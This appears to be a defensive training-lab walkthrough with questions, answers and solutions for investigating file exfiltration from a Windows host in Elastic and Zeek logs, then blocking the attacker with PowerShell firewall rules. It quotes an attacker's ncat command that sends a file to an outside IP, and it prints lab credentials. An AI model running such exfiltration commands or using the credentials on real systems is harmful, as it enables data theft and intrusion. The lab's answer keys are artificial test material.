Identify File Exfiltration 1
Use Elastic to identify threat actor activities related to file exfiltration.

﻿

Question:
﻿

What compromised host shows signs of file exfiltration?
﻿

(Enter the host name, e.g., win-pc

dev-win10-13

<img width="1901" height="566" alt="image" src="https://github.com/user-attachments/assets/a61473e5-2954-4b53-8426-2182eeda202d" />



Identify Exfiltration 1 Solution
Query to identify use of a Meterpreter shell binary on the system. The execution of one of these binaries typically appears as a file being executed to establish a network connection. 

﻿

Use a query to search for executables and outgoing connections caused by the executable. 

﻿

Enter the following query:

event.dataset: network_connection and *.exe
﻿

The query displays all executables that established a network connection. However, there are many common processes in use by normal operations that can be excluded. 

﻿

Enter the following appended query:

event.dataset: network_connection AND *.exe AND NOT svchost.exe AND NOT MSExchange* AND NOT w3wp.exe
﻿

Only nine results are returned in this data set, which helps display less common processes in use. 

﻿

Select the process.executable filter and visualize the results. Alter the graph so that all nine options can be viewed. 

﻿

As shown in Figure 37-1 below, the two processes that stand out are C:\Program Files (x86)\Nmap\ncat.exe and C:\Users\Administration\OneNotes.exe.

<img width="1685" height="800" alt="image" src="https://github.com/user-attachments/assets/c27df700-8c63-4218-a4b5-202a87fd8cab" />


The OneNotes.exe process is an intentional misspelling of the OneNote application from Microsoft.


Return to the Discover page to initiate a new search for the suspicious executable, OneNotes.exe. 
 ﻿
Enter the following query:
event.dataset: network_connection AND OneNotes.exe



The query returns one log. The log shows a network connection from 172.16.5.83 to 13.31.175.25 over port 8080. The destination Internet Protocol (IP) address is not a known asset in the environment. 


Use this initial access to identify more details, such as the device host name, dev-win10-13


----------------------------


Investigate Exfiltration Details
Investigate the file exfiltration to determine key details of the files and exfiltration methods.

﻿

Question:
﻿

What is the file size of the first exfiltrated file?
﻿

(Enter the file size in megabytes, e.g., 2.7)

1.4

<img width="1902" height="564" alt="image" src="https://github.com/user-attachments/assets/a5142742-4143-417b-8046-0124bcb0244b" />


Investigate Exfiltration Details Solution
When gathering details of the file extraction, the file size or file name cannot be seen by looking at Windows Event Logs. However, the Windows Event Logs reveal that the netcat command was used. Use those logs to identify the destination IP address and victim host name, 13.31.175.25 and dev-win10-13 respectively. 

﻿

The filters need to be less restrictive to uncover additional details.

﻿

Identify additional logs involving the host and destination. Enter the following query:

agent.name: dev-win10-13 AND 13.31.175.25
﻿

The query displays all Windows logs that correlate to the two hosts. Identify the log time when netcat was used and look at events that occurred with a similar timestamp. The Windows log identifies only the initiation of an executable and does not show the file size of the transfer.

﻿

Review the events of network connections. Enter the following query:

event.dataset: network_connection AND 13.31.175.25
﻿

In the query results of the connectivity events, there are network logs that show a connection from dev-win10-13 to 13.31.175. Inspect the traffic of the connection. 

﻿

Figure 37-2 below displays the details of the connection from dev-win10-13 to 13.31.175


<img width="2048" height="246" alt="image" src="https://github.com/user-attachments/assets/2fcb724d-64f3-4ff7-bc6d-535c33748d3c" />


The timestamp appears before the Windows Event Log generated the netcat command. Inspecting the traffic reveals the size of the file as 1.4 megabytes (MB)


-----------------------------

Identify the Network Port
Use network-specific details to create disruption techniques for the attack. 

﻿

Question:
﻿

What is the destination port of the first exfiltrated file?
﻿

(Enter the port number)

443


<img width="1905" height="562" alt="image" src="https://github.com/user-attachments/assets/db0140c7-5235-4f7c-affb-13588969a507" />


Identify the Network Port Solution
Review the network activity of the logs regarding the file exfiltration.

﻿

As seen in Figure 37-3 below, the connection log reveals that the destination port is 443

<img width="991" height="353" alt="image" src="https://github.com/user-attachments/assets/a5faa83d-1bfa-4278-a83d-12a0d000d163" />


-------------


Identify Data Exfiltration Solution
The adversary’s use of port 443 can suggest HTTPS as the protocol. This provides a secure encrypted channel for distributing a file. However, further details of the file transfer must be inspected to validate whether HTTPS was actually used for the file exfiltration.

﻿

Enter the following query to identify the connections over HTTPS:

agent.name: dev-win10-13 AND destination.port: 443
﻿

Two events are returned. View the first event at 11:04:47. The log indicates that ncat.exe was used to initiate the connection over port 443 using the Transmission Control Protocol (TCP). This is not HTTPS traffic.

﻿

Search for the connection logs involving ncat.exe. 

﻿

Enter the following query:

event.dataset: conn AND 172.16.5.83 AND destination.port: 443
﻿

The four returned events show that two events occurred at 11:04:29. Review these two logs to identify the behavior.  

﻿

As seen in Figure 37-4 below, the message of the log shows no indication of the encrypted HTTPS protocol in use


<img width="2048" height="310" alt="image" src="https://github.com/user-attachments/assets/ed575aae-0aec-45b1-a359-36ab07c45b92" />

This means that the attacker used a known port number of an encrypted protocol to send data without the encryption of the actual protocol. 

---------------


Identify File Exfiltration 2
Investigate the second instance of exfiltration to understand the extent of the damage.

﻿

Question:
﻿

What port was used to exfiltrate the second file?
﻿

(Enter the port number)

22

<img width="1897" height="404" alt="image" src="https://github.com/user-attachments/assets/60f880e1-8b4b-4cc2-98ad-cbdc8918602b" />


Identify File Exfiltration 2 Solution
Enter the following query to isolate the two IP addresses:

172.16.5.83 AND 13.31.175.25
﻿

Review the log details, as seen in Figure 37-5 below.


<img width="538" height="325" alt="image" src="https://github.com/user-attachments/assets/a0bf65c5-add3-45e6-aba4-4d21aee6bf08" />


The second occurrence of a file transfer was conducted with a similar method as the initial transfer. However, there was a small alteration to use port 22


---------------


Identify File Exfiltration 3
Question:
﻿

What is the timestamp of the log associated with the third file exfiltration command? 
﻿

(Enter time as HH:MM:SS)

11:08:42


<img width="1920" height="464" alt="image" src="https://github.com/user-attachments/assets/ee7321c3-c903-49f6-be5e-d3609baf12aa" />

Identify File Exfiltration 3 Solution
Search for event.dataset: process_creation in a query. 

﻿

Enter the following query:

172.16.5.83 AND 13.31.175.25 AND event.dataset: process_creation
﻿

Identify the third series of logs related to file exfiltration. 

﻿

As seen in Figure 37-6 below, the timestamp from the Windows Event Log is May 9, 2023 @ 11:08:42.047. 


<img width="1559" height="213" alt="image" src="https://github.com/user-attachments/assets/7d6de27e-20a0-44f6-8a35-079bbd6fc752" />


---------------


Investigate Malicious Activity
Question:
﻿

What Zeek event name is associated with the threat actor establishing a new C2 connection?
﻿

(Enter the Zeek event name, e.g., network_connection)

bad_HTTP_request

<img width="1912" height="545" alt="image" src="https://github.com/user-attachments/assets/e43e7b20-4b1a-479c-9990-82dd252f15b0" />


Investigate Malicious Activity Solution
Zeek logs can be found in the event.dataset: weird subset.  

﻿

Investigate the logs in this dataset for strange behavior, as seen in Figure 37-7 below. 


<img width="1228" height="430" alt="image" src="https://github.com/user-attachments/assets/aa216426-7f9c-409f-a13e-4f1015d73a13" />


The potentially malicious activity is flagged as bad_HTTP_request. This means that the HTTP port is being used for purposes other than HTTP. When reviewing the connections from the attacker, it is evident that a new C2 channel was established


--------------------

Identify File Exfiltration 4
Another file has been exfiltrated by the attacker. Review the new behavior to answer the following question.

﻿

Question:
﻿

Which method was used by the attacker to exfiltrate the fourth file?


<img width="1883" height="511" alt="image" src="https://github.com/user-attachments/assets/cb23eda8-7f99-4464-ac42-e8dd8bed416e" />

Identify File Exfiltration 4 Solution
Review the activity over port 80.

﻿

Enter the following query:

172.16.5.83 AND 13.31.175.25 AND destination.port: 80
﻿

Ignore the logs in event.dataset:weird. There are two logs that show a conn.log for a SYN/FIN connection as normal. 

﻿

The first log shows a high number of packets and data traveling over the network, as seen in Figure 37-8 below


<img width="965" height="274" alt="image" src="https://github.com/user-attachments/assets/f0f511e0-baae-4adc-b93a-83a9e974e2b2" />

As the query illustrates, the connection occurred over destination port 80, which was the same port used to establish the C2 channel. Therefore, the attacker exfiltrated a file over the new C2 channel on port 80


-------------------


Identify File Exfiltration 5
The attacker continued extractions using their new C2 channel. Identify the activities of that channel to identify details of the final exfiltration event.

﻿

Question:
﻿

From which directory did the attacker exfiltrate the fifth file?
﻿

(Enter the directory path, e.g., C:\ProgramFiles)

C:\Users\trainee\Documents\

<img width="1907" height="554" alt="image" src="https://github.com/user-attachments/assets/24072a25-9bf8-4ec8-a57c-26dca7fdffe7" />


Identify File Exfiltration 5 Solution
Alter the following query:  

172.16.5.83 AND 13.31.175.25 AND destination.port: 80
﻿

Search for the process creation data including the victim and attacker IP addresses. 

﻿

Based on the specified timeframe, view the last Windows Event Log to see key details of the command executed by the attacker.  

﻿

In the event message details, as seen in Figure 37-9 below, the following command is displayed:

ncat -w 3 13.31.175.25 443


<img width="767" height="107" alt="image" src="https://github.com/user-attachments/assets/43dd9ab1-07dc-49c2-92bc-fce479b99822" />

The event message details reveal that the file directory used to issue the command is C:\Users\trainee\Documents\.


-----------------------


Identify the Blocked Firewall Service
Question:
﻿

What is the port number for the firewall service that the threat actor blocked?
﻿

(Enter the correct answer)


3389


<img width="1900" height="357" alt="image" src="https://github.com/user-attachments/assets/12da60fe-f6e1-47ff-958c-03864f95aa6d" />


Identify the Blocked Firewall Service Solution
In Elastic, filter the dataset down to the dev-win10-13 host and examine the process.command_line field. 

﻿

As seen in Figure 37-10 below, enter the following query:

agent.name:dev-win10-13 and process.command_line:*


<img width="1779" height="544" alt="image" src="https://github.com/user-attachments/assets/9566de03-cec9-42c3-a801-0c837922bbc9" />

Add a display filter that only shows the process.command_line column. 


Add the filter process.command_line:exists to remove all blank process.command_line values. 


The results reveal a PowerShell command that adds a firewall rule to the device. 


As seen in Figure 37-11 below, this result shows that the threat actors created a rule named BlockAdmins and blocked port 3389. Port 3389 is responsible for Remote Desktop Protocol (RDP). 

<img width="3094" height="525" alt="image" src="https://github.com/user-attachments/assets/49327b63-5609-49c4-81f2-337b278bba9a" />


-------------------

Remove the Firewall Rule
Use the dev-win-10-13 VM to answer the remaining questions in this section. The credentials are as follows:

Username: Administrator
Password: CyberTraining1!
﻿

Question:
﻿

Which PowerShell command removes the firewall rule blocking port 3389?

Remove-NetFirewallRule -DisplayName "BlockAdmins"

<img width="1489" height="97" alt="image" src="https://github.com/user-attachments/assets/c8f3662d-69c4-4136-91ce-67415fc00339" />

<img width="899" height="82" alt="image" src="https://github.com/user-attachments/assets/f2b11dee-08fb-4b3b-b79a-dd790ed25532" />


Remove the Firewall Rule Solution
A PowerShell query can be performed to gather more information about the BlockAdmins rule to see if it is still active on the system.

﻿

Enter the following query to view the existing rule:

Show-NetFirewallRule|Where {$_.DisplayName -eq 'BlockAdmins'}
﻿

Enter the following query to remove the rule:

Remove-NetFirewallRule -DisplayName "BlockAdmins"
﻿

To confirm the rule has been deleted, enter the following query:

Show-NetFirewallRule|Where {$_.DisplayName -eq 'BlockAdmins'}
﻿

If no results are displayed, the rule has been successfully removed, as seen in Figure 37-12 below. 


<img width="1359" height="772" alt="image" src="https://github.com/user-attachments/assets/6ebced56-4268-4248-a669-70471d822838" />


---------------


Identify Mitigations
Question:
﻿

Which PowerShell command adds a firewall rule that blocks all connections from the host to the attacker?
﻿

(Select the correct answer)


New-NetFirewallRule -DisplayName "Block Threat Actor" -Direction Outbound -LocalPort Any -Protocol Any -Action Block -RemoteAddress 13.31.175.25



Identify Mitigations Solution
At the time of the attack, the C2 connection between dev-win-10-13 and the attacker was still active.

﻿

The C2 connection from the attacker is no longer active, however the firewall rule must be checked to ensure it blocks similar connections in the future. 

﻿

In PowerShell, run the following command to see if packets reach the attacker IP:

ping 13.31.175.25
﻿

Figure 37-13 below displays the ping results.



<img width="612" height="229" alt="image" src="https://github.com/user-attachments/assets/7510576a-19cd-4d2e-855f-9ce35c8b363e" />

Implement the firewall rule to block the connection.
 
As seen in Figure 37-14 below, enter the following command:
New-NetFirewallRule -DisplayName "Block Threat Actor" -Direction Outbound -LocalPort Any -Protocol Any -Action Block -RemoteAddress 13.31.175.25



<img width="1806" height="496" alt="image" src="https://github.com/user-attachments/assets/5b44ec31-b4ce-401b-b55c-d1d061c27749" />




Ping the IP address again by entering the following command:
ping 13.31.175.25



As seen in Figure 37-15 below, no packets are traversing the network to IP 13.31.175.25


<img width="619" height="237" alt="image" src="https://github.com/user-attachments/assets/efd895f1-8699-4d76-b26e-c371285b034d" />


--------------


Verify Mitigations
Question:
﻿

What log file on Windows can be examined to verify that the threat actor's IP has been blocked?
﻿

(Enter the name of the log file, e.g., blocked.log)


pfirewall.log


C:\Windows\System32\LogFiles\Firewall



Verify Mitigations Solution
The path for the Windows firewall log is C:\Windows\System32\LogFiles\Firewall\pfirewall.log. 

﻿

As seen in Figure 37-16 below, there are multiple dropped packets for data going to 13.31.175.25. This confirms that data is no longer reaching the threat actor’s network. 

<img width="1335" height="624" alt="image" src="https://github.com/user-attachments/assets/62e0b350-992e-4d70-8d4d-d880450c42ad" />

















































































































































































































































































































































































































































